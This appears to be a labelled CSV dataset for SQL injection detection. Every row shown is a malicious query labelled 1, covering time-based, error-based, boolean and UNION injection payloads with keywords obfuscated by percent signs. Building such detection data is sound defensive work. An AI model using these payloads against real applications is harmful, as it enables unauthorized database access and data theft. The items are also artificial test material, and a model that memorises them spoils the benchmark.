Query,Label
"1""  )   %%w%he%r%e 2922  =  2922 %or elt  (  6272  =  6272,sleep  (  5   )    )   --",1
"1%""   )    )     )   %a%%n%d char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substr%%i%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%n%%ul%l  )  ,0  )  ,500000000  )  ,%n%%ul%l  )  --",1
"-9003""   )    )    %%u%n%io%n all %s%%el%e%c%t 9721,9721--",1
1'  )   as syer %w%%h%%e%%r%e 3141  =  3141 r%%l%%i%k%%e   (  %%s%ele%%c%t   (  case when   (  6233  =  7567  )   then 1 else 0x28 end   )    )   --,1
-2483' wh%e%re 1327  =  1327 %un%i%%o%n all %%s%%e%%l%e%c%%t 1327#,1
"-8699""  )   %u%%n%%i%o%n all s%e%l%e%c%%t 8645,8645,8645,8645,8645,8645--",1
end %%a%%n%%d   (  'uxzv'  =  'uxzv,1
"1"" %a%n%d 6510  =    (  %s%%e%%le%%c%t count  (  *  )   %fro%%m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1
"1' an%%d 5556  =    (  %%se%%l%%ec%%t count  (  *  )   %fr%o%%m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   an%%d 'hhbh'  =  'hhbh",1
"1  )   as nfgb %%w%h%e%%r%e 2503  =  2503 %an%%d row  (  6237,7469  )  >  (  %se%l%e%%ct count  (  *  )  ,concat  (  0x7171706a71,  (  %se%l%e%%ct   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floo%r  (  r%an%%d  (  0  )  *2   )    )   x %f%r%o%m   (  %se%l%e%%ct 5192 %%u%n%i%on %se%l%e%%ct 3785 %%u%n%i%on %se%l%e%%ct 3931 %%u%n%i%on %se%l%e%%ct 7158  )  a group b%y x  )  --",1
"1%""   )    )    %o%%r char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substr%%ing  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%n%u%%l%%l  )  ,0  )  ,500000000  )  ,%n%u%%l%%l  )   an%%d    (    (   ""%""  =  """,1
"1""   )    )    o%r 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
"1%'  )   %%a%n%d char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substr%i%%ng  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,n%u%ll  )  --",1
s%e%le%c%%t sleep  (  5  )   %%a%%n%%d    (    (   'uyft'  =  'uyft,1
-6100'  )   as kvfc %%w%%he%re 2377  =  2377 or 6872  =  6872--,1
"1'   )    )    and row  (  6237,7469  )  >  (  s%e%l%%e%ct count  (  *  )  ,concat  (  0x7171706a71,  (  s%e%l%%e%ct   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,flo%o%%r  (  rand  (  0  )  *2   )    )   x %f%r%om   (  s%e%l%%e%ct 5192 un%%io%%n s%e%l%%e%ct 3785 un%%io%%n s%e%l%%e%ct 3931 un%%io%%n s%e%l%%e%ct 7158  )  a group %%by x  )   and    (    (   'adnz'  =  'adnz",1
"1""  )   %%a%n%d 4595  =  4595#",1
1   )    )     )   %%%o%r%d%e%%r %b%%y 1--,1
1' in boolean mode  )   a%%n%d   (  3020  =  3020  )  *6703#,1
"1   )    )    an%%d make_s%e%t  (  8403  =  8403,8899  )   an%%d    (    (   4686  =  4686",1
1 %w%%here 9361  =  9361 %%a%%n%d 7478  =  9170--,1
%%sel%e%%c%%t   (  case when   (  9490  =  6134  )   then 9490 else cast  (  1 as %%i%nt  )  /  (  %%sel%e%%c%%t 0 %f%r%%o%m dual  )   end  )   %f%r%%o%m dual--,1
"1'   )    )    %%o%%r 8421  =    (  %%s%%e%l%e%c%t count  (  *  )   %%f%%ro%%m generate_series  (  1,5000000   )    )    %%an%d    (    (   'lqpd'  =  'lqpd",1
-4768'||  (  %%s%%e%%l%%e%%c%%t 'dded' f%ro%%m dual wh%er%%e 6499  =  6499 uni%on all %%s%%e%%l%%e%%c%%t 6499--,1
"1'||  (  %%s%e%le%%c%%t 'lzvb' w%h%%e%%re 1637  =  1637 u%n%i%on all %%s%e%le%%c%%t %n%u%l%l,%n%u%l%l,%n%u%l%l,%n%u%l%l,%n%u%l%l,%n%u%l%l,%n%u%l%l,%n%u%l%l#",1
"-8308""  )   %%u%n%%i%%o%n all %s%e%l%e%%c%%t 3084,3084,3084,3084,3084,3084,3084,3084,3084#",1
s%%e%%le%%ct   (  case when   (  6047  =  8897  )   then 6047 else 6047*  (  s%%e%%le%%ct 6047 f%r%o%%m %i%nf%%o%%rmation_schema.character_%%se%ts  )   end  )  #,1
"1,  (  %s%e%%le%c%t 2*  (  if   (    (   %s%e%%le%c%t * fr%om   (  %s%e%%le%c%t concat  (  0x7171706a71,  (  %s%e%%le%c%t   (  elt  (  9693  =  9693,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1
"1'  )   %w%he%%r%e 2284  =  2284 a%%n%%d make_%s%%e%t  (  8403  =  8403,8899  )  --",1
-6014'   )    )    %%o%r   (  9860  =  4848  )  *4848 an%%d    (    (   'qtge'  =  'qtge,1
%sel%%e%%c%t case when 4656  =  3716 then 1 else %%n%u%%l%l end--,1
"1"" w%%h%e%r%e 8571  =  8571",1
"1""  )   %%a%%n%%d 3732  =  3850 %%a%%n%%d   (  ""edjv""  =  ""edjv",1
end#,1
1'   )    )    %%u%n%i%%o%%n all s%%e%%l%e%c%%t nu%%ll#,1
"1""   )    )    %%and 7656  =  5604 %%and    (    (   ""zuhv""  =  ""zuhv",1
"1   )    )    as llnm %%wh%%e%%re 6510  =  6510 %%a%n%%d 3202  =  %%l%%i%k%e  (  'abcdefg',upper  (  hex  (  r%%a%n%%domblob  (  500000000/2   )    )      )    )   --",1
"1""  )   %un%i%o%%n all s%e%%l%%e%c%%t nu%l%%l,nu%l%%l,nu%l%%l,nu%l%%l,nu%l%%l,nu%l%%l,nu%l%%l,nu%l%%l--",1
"1'   )    )     (  %%s%ele%c%t   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,nu%l%l  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   f%r%%o%%m inf%%ormation_schema.system_users  )   a%%n%d    (    (   'rnyb'  =  'rnyb",1
1' in boolean mode  )   %a%n%%d   (  %s%ele%c%t * f%%r%om   (  %s%ele%c%t  (  sleep  (  5   )    )     )  gcrr  )  #,1
"1 %%w%%h%%e%%r%e 6095  =  6095 a%%n%d 8407  =    (  %se%l%e%%ct count  (  *  )   %%f%%r%om generate_series  (  1,5000000   )    )   --",1
1'  )   or 6793  =    (  %s%e%%le%c%%t 6793 %%f%%r%om pg_sleep  (  5   )    )    %a%%n%%d   (  'dtzt' lik%e 'dtzt,1
1' whe%re 9003  =  9003 waitf%or delay '0:0:5'--,1
"-6639'  )   as trll w%%he%r%e 6271  =  6271 %u%n%i%%o%%n all %%se%%le%%ct 6271,6271,6271#",1
"1""  )   waitf%or delay '0:0:5'--",1
"1"" %%a%%n%d 3707  =    (  s%e%%l%%e%c%%t count  (  *  )   f%rom sysibm.sys%%t%a%%b%%les as t1,sysibm.sys%%t%a%%b%%les as t2,sysibm.sys%%t%a%%b%%les as t3  )   %%a%%n%d ""cgps"" li%k%%e ""cgps",1
end a%n%%d    (    (     (  'gqhc'  =  'gqhc,1
1'   )    )    as wqhm %wher%%e 9871  =  9871,1
"1""   )    )    and exp  (  ~  (  %se%%l%%ect * fr%o%%m   (  %se%%l%%ect concat  (  0x7171706a71,  (  %se%%l%%ect   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""rvuz"" l%i%k%%e ""rvuz",1
-3458'  )   %%w%%h%er%%e 2053  =  2053 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %s%%ele%%ct   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   %fro%%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1
%s%%el%%ec%t   (  case when   (  2576  =  7563  )   then 2576 else 1/  (  %s%%el%%ec%t 0  )   end  )  --,1
"selec%%t sleep  (  5  )   a%n%%d ""irxg""  =  ""irxg",1
%%s%%e%%lec%t case when 8514  =  3207 then 1 else %%n%u%%ll end--,1
1   )    )    waitf%%o%r delay '0:0:5'--,1
"1""   )    )    as bovm %w%h%e%%r%e 5560  =  5560 %un%%i%%o%n all %%s%%el%e%%c%t n%ull,n%ull,n%ull,n%ull,n%ull,n%ull,n%ull#",1
"1""   )    )    o%r 7417  =    (  %s%e%l%%e%c%t count  (  *  )   %f%%r%om sysibm.sys%%ta%%b%l%%es as t1,sysibm.sys%%ta%%b%l%%es as t2,sysibm.sys%%ta%%b%l%%es as t3  )  --",1
if  (  8727  =  4039  )   %%se%%l%e%ct 8727 else %dr%%op function giql--,1
"1' in boolean mode  )   and make_s%e%t  (  8403  =  8403,8899  )  #",1
1' %i%%n boolean mode  )   r%%lik%e   (  s%e%%l%e%c%t   (  case when   (  1343  =  1595  )   then 1 else 0x28 end   )    )   #,1
"-6599""   )    )    u%n%i%%o%%n all %s%e%%l%%e%%c%t 2870,2870,2870,2870,2870,2870,2870,2870,2870,2870--",1
"1%'   )    )     )   %%or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substr%%ing  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,n%%u%l%%l  )   %a%nd    (    (     (  '%'  =  '",1
"-4025"" %%or 3038  =  3038",1
"1"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  %se%%l%e%c%%t   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   ",1
"1'   )    )     )   o%%r exp  (  ~  (  sel%e%c%t * %f%r%%om   (  sel%e%c%t concat  (  0x7171706a71,  (  sel%e%c%t   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    a%%n%%d    (    (     (  'jwbt'  =  'jwbt",1
1'  )   %wh%er%e 2227  =  2227,1
"1%""   )    )     )   %%o%%r 4411  =    (  %%s%%el%e%c%t count  (  *  )   %f%r%o%m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   an%%d    (    (     (  ""%""  =  """,1
1  )   %%o%%r%d%%er %%b%y 1--,1
"1"" a%%n%d 5556  =    (  %%se%le%ct count  (  *  )   %%f%r%%om all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   a%%n%d ""epxq"" %l%%ike ""epxq",1
"1""   )    )    %a%%n%%d elt  (  1210  =  1210,sleep  (  5   )    )    %a%%n%%d    (    (   ""utlk"" %lik%%e ""utlk",1
"1%' %%a%%n%d 8189  =    (  se%%l%%ec%%t count  (  *  )   %%f%r%%om sysibm.sys%ta%%b%l%es as t1,sysibm.sys%ta%%b%l%es as t2,sysibm.sys%ta%%b%l%es as t3  )  --",1
"1 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substr%i%ng  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,nul%%l  )  --",1
"1'   )    )    as qcgf %w%%h%%e%re 9656  =  9656 %%or 5356  =    (  s%%el%%e%%c%%t count  (  *  )   %%fro%%m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
1'   )    )    %o%%r 4240  =    (  %%s%%e%%lec%t 4240 %%fr%%o%m pg_sleep  (  5   )    )   --,1
"-1451%'  )   %%u%%ni%%o%n all s%%e%%le%c%t 7666,7666,7666#",1
"-6126 %%u%n%%ion all s%e%l%%ec%%t 8486,8486,8486,8486,8486,8486,8486,8486,8486--",1
"1'+  (  %%s%e%l%%e%c%%t 'qvif' %%w%h%%e%re 1758  =  1758 un%%io%n all %%s%e%l%%e%c%%t %%n%%u%%l%l,%%n%%u%%l%l,%%n%%u%%l%l,%%n%%u%%l%l,%%n%%u%%l%l,%%n%%u%%l%l,%%n%%u%%l%l,%%n%%u%%l%l#",1
"1""  )   %a%n%d   (  se%%l%%e%c%%t 2*  (  if   (    (   se%%l%%e%c%%t * %f%%ro%%m   (  se%%l%%e%c%%t concat  (  0x7171706a71,  (  se%%l%%e%c%%t   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   %a%n%d   (  ""rkry"" %li%%ke ""rkry",1
"-2007' %%w%%h%%e%%r%e 9157  =  9157 u%%nio%%n all %%se%%l%%e%%c%%t 9157,9157,9157,9157,9157,9157,9157,9157,9157#",1
"1 %%o%r 6979  =  %%l%i%k%%e  (  'abcdefg',upper  (  hex  (  r%an%%domblob  (  500000000/2   )    )      )    )   --",1
"1%""   )    )    r%l%%i%k%e   (  %se%%lect * f%r%om   (  %se%%lect  (  sleep  (  5   )    )     )  vwyq  )  #",1
-2817  )   %%w%%he%re 1212  =  1212 %%o%%r 3266  =  1102,1
"iif  (  9229  =  4158,1,1/0  )  ",1
"1,  (  %%se%l%e%ct   (  case when   (  9443  =  9443  )   then sleep  (  5  )   else 9443*  (  %%se%l%e%ct 9443 %f%r%o%m i%nfo%%rmation_schema.character_%s%%ets  )   end   )    )   ",1
"%se%%l%ec%%t count  (  *  )   %%f%%r%o%%m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 a%%nd    (    (     (  '%'  =  '",1
1'   )    )    %o%%rd%%e%r %%by 1--,1
-5803  )   w%he%%r%e 8651  =  8651 %or 4493  =  utl_%%i%naddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  se%le%%c%t   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   %%f%r%%om dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1
"1 a%%n%d exp  (  ~  (  %se%l%e%%ct * %%f%%ro%%m   (  %se%l%e%%ct concat  (  0x7171706a71,  (  %se%l%e%%ct   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   # mpyu",1
"1""   )    )    %u%ni%%o%%n all %s%e%l%e%%c%t nu%%l%%l,nu%%l%%l,nu%%l%%l,nu%%l%%l,nu%%l%%l,nu%%l%%l,nu%%l%%l#",1
%%s%e%l%%e%ct   (  case when   (  2352  =  8672  )   then 2352 else 2352*  (  %%s%e%l%%e%ct 2352 from i%%nfo%%rmation_schema.character_s%e%ts  )   end  )  #,1
"1'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  se%%l%e%%c%%t   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   a%%n%d    (    (     (  'ichh' %%l%i%%k%e 'ichh",1
1' %an%d 6621  =  4681--,1
1' an%%d 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  s%e%%l%%ect   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   %f%%r%om dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   an%%d 'oofd'  =  'oofd,1
"1%'   )    )    %%o%r 4915  =    (  %%s%e%%l%e%c%t count  (  *  )   %f%%rom domai%n.domai%ns as t1,domai%n.columns as t2,domai%n.%%t%a%b%l%es as t3  )  --",1
"1 %%o%%r 8384  =  %%like  (  'abcdefg',upper  (  hex  (  r%andomblob  (  500000000/2   )    )      )    )   ",1
"1'  )   as uvxl w%%h%%e%%r%e 6211  =  6211 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  %%s%e%l%%ect   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1
"1' %i%n boolean mode  )   %%a%n%d %%u%pd%at%exml  (  3393,concat  (  0x2e,0x7171706a71,  (  %%s%e%%l%%ec%t   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  #",1
-3582  )   w%%h%%e%r%%e 5873  =  5873 %or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  se%%lec%t   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   %fro%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1
"1'  )   as fyuh %%where 7608  =  7608 a%%n%%d 4241  =  convert  (  %int,  (  %%s%el%ect char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  %%s%el%ect   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
"-1269"" %u%ni%%on all sele%c%t 8412,8412,8412,8412,8412,8412,8412,8412--",1
"1' o%%r u%%pd%%at%exml  (  1808,concat  (  0x2e,0x7171706a71,  (  %s%e%%le%c%t   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  ",1
-4758%'   )    )    %%o%%r 5903  =    (  'qqpjq'||  (  %%s%el%%ec%t case 5903 when 5903 then 1 else 0 end f%%r%%o%m rdb$datab%a%s%%e  )  ||'qzvzq'  )   %%a%%nd    (    (   '%'  =  ',1
"-9891"" %%unio%%n all %sel%%e%%c%%t 7489#",1
1%' %%uni%o%n all %s%el%%e%%c%t %%n%%u%ll#,1
"-1707  )   %%o%%r 1570  =  convert  (  %%i%nt,  (  se%lect char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  se%lect   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   %%an%%d   (  7756  =  7756",1
"-8981%""   )    )     )   %un%i%%on all se%%le%%c%t 4538,4538,4538,4538,4538,4538,4538#",1
"-3913"" %%w%%h%%e%%re 6085  =  6085 %u%n%%i%%o%n all %%s%%e%l%e%%ct 6085,6085,6085,6085,6085,6085,6085#",1
"1""  )   %whe%r%e 3958  =  3958 %%o%r 6979  =  %%li%ke  (  'abcdefg',upper  (  hex  (  r%an%domblob  (  500000000/2   )    )      )    )   --",1
"-4381 o%r make_s%et  (  6118  =  3095,3095  )  # lkcr",1
1' rlike   (  %se%%l%ect   (  case when   (  5567  =  5586  )   then 1 else 0x28 end   )    )    a%n%%d 'mmnb'  =  'mmnb,1
"-1196""   )    )    %%or 1570  =  convert  (  i%%nt,  (  sele%c%t char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  sele%c%t   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   a%%nd    (    (   ""srlq""  =  ""srlq",1
1'||  (  %%s%e%l%%e%%ct 'sdll' wh%ere 5074  =  5074 %o%r   (  %%s%e%l%%e%%ct * %%f%%r%om   (  %%s%e%l%%e%%ct  (  sleep  (  5   )    )     )  ydpu   )    )   ||',1
"1""   )    )    %u%%nio%%n all %s%ele%%c%%t n%%u%%ll,n%%u%%ll,n%%u%%ll#",1
"1""  )   %%w%he%%re 6065  =  6065 a%%n%%d 6510  =    (  %s%e%lec%%t count  (  *  )   %%f%%r%o%m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"-4256'  )   %%w%%h%%er%e 9545  =  9545 %o%r 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %se%%l%e%%ct   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   %fr%%om dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
"1%""   )    )     )   %%a%%nd 8635  =    (  %s%%e%%l%%ec%%t count  (  *  )   %%f%%ro%m generate_series  (  1,5000000   )    )   --",1
"-7776'  )   %o%%r 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %se%l%ec%%t   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   %%f%r%o%%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   %%a%nd   (  'ihof'  =  'ihof",1
1'   )    )    a%%nd   (  5091  =  8681  )  *8681 a%%nd    (    (   'xevm'  =  'xevm,1
"1%"" a%n%d 6510  =    (  s%%ele%c%t count  (  *  )   fr%%o%m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   a%n%d ""%""  =  """,1
"1%""   )    )     )   %%and 4595  =  4595#",1
"-2102' wh%%e%%re 3644  =  3644 %%o%%r 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %s%e%%l%%e%%c%t   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   %f%ro%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
-7903 %%w%%her%e 6699  =  6699 %o%%r 8571  =  8571--,1
"%s%%e%%l%e%c%%t count  (  *  )   %f%r%%o%%m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5",1
"-5066'   )    )    unio%%n all se%l%ec%t 9689,9689,9689,9689#",1
"1'||  (  %se%l%%e%c%t 'nfgq' %w%%he%%r%%e 1837  =  1837 %%an%%d char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substr%i%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%%null  )  ,0  )  ,500000000  )  ,%%null  )  --",1
"1""   )    )     )   %%o%%r char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substr%%i%ng  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,%%n%%u%ll  )   %%and    (    (     (  ""vfoh""  =  ""vfoh",1
1  )   as ztrb wh%er%%e 1052  =  1052 %%and   (  s%e%l%e%%c%%t * %%fr%%o%%m   (  s%e%l%e%%c%%t  (  sleep  (  5   )    )     )  gcrr  )  #,1
"1%""   )    )     )   %%uni%%o%%n all %%s%%elec%t %%nul%%l--",1
"1%'   )    )     )   %u%%ni%%on all %%s%e%le%c%%t %n%%u%%ll,%n%%u%%ll,%n%%u%%ll,%n%%u%%ll,%n%%u%%ll#",1
"-4692%""   )    )    unio%n all s%e%le%%c%t 1781,1781#",1
"1""  )   as xrsi %w%he%re 9498  =  9498",1
"1%""   )    )    %%or 8384  =  %li%ke  (  'abcdefg',upper  (  hex  (  ra%%n%domblob  (  500000000/2   )    )      )    )    a%%n%d    (    (   ""%""  =  """,1
"1'  )   as myxr %%w%he%%r%%e 6299  =  6299 %a%n%%d char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substr%%i%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%%nul%l  )  ,0  )  ,500000000  )  ,%%nul%l  )  --",1
"1'  )   as yhgk %w%h%er%e 9246  =  9246 an%%d char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substr%i%ng  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,%%n%u%%ll  )  --",1
"1"" %%wh%%e%re 7279  =  7279 %o%%r 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
"1%"" and elt  (  5345  =  8751,8751  )   and ""%""  =  """,1
1   )    )    as xcsm %%w%h%%e%re 9231  =  9231,1
"1""  )   as vdim wh%e%%r%%e 1296  =  1296",1
"call regexp_substri%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nu%l%%l  )  ,0  )  ,500000000  )  ,nu%l%%l  )   %and    (    (   '%'  =  '",1
"1'  )   as viex %%wh%e%r%e 6242  =  6242 a%%nd 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1
"1"" %o%r   (  %s%%ele%c%%t * f%%rom   (  %s%%ele%c%%t  (  sleep  (  5   )    )     )  ydpu  )  ",1
"1'+  (  s%elec%t 'sqje' %%wh%e%%r%%e 1634  =  1634 %or exp  (  ~  (  s%elec%t * f%%r%%o%%m   (  s%elec%t concat  (  0x7171706a71,  (  s%elec%t   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  +'",1
"1'   )    )    as uncy w%%h%e%re 8009  =  8009 u%n%ion all se%l%%ec%%t n%u%%l%l,n%u%%l%l,n%u%%l%l,n%u%%l%l,n%u%%l%l,n%u%%l%l,n%u%%l%l,n%u%%l%l,n%u%%l%l#",1
1'||  (  %%se%%l%e%%ct 'avxz' from dual %w%he%r%e 7815  =  7815,1
1'||  (  %%s%%e%l%%e%c%%t 'glyc' %%f%ro%%m dual %%w%%h%%ere 4058  =  4058,1
1   )    )     )   waitf%o%%r delay '0:0:5' and    (    (     (  3481  =  3481,1
"1'||  (  %%s%el%%e%%ct 'ssvp' %w%%h%ere 3300  =  3300 o%r 2367  =    (  %%s%el%%e%%ct count  (  *  )   %f%r%om rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
1'  )   as sjij %%w%%her%%e 8659  =  8659,1
1' %and 2908  =  8067--,1
"1%'   )    )    a%%n%d 3202  =  %li%ke  (  'abcdefg',upper  (  hex  (  ra%%n%domblob  (  500000000/2   )    )      )    )    a%%n%d    (    (   '%'  =  '",1
"1"" %%wh%%e%%re 7371  =  7371 waitf%or delay '0:0:5'--",1
"1""  )   %and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  s%%ele%c%t   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   %and   (  ""zyeo"" %l%%i%%k%%e ""zyeo",1
"1%'   )    )    %%uni%on all %%s%%e%l%%ect %%n%%u%l%l,%%n%%u%l%l,%%n%%u%l%l,%%n%%u%l%l--",1
1' %i%n boolean mode  )   %%a%n%%d 4457  =  3885#,1
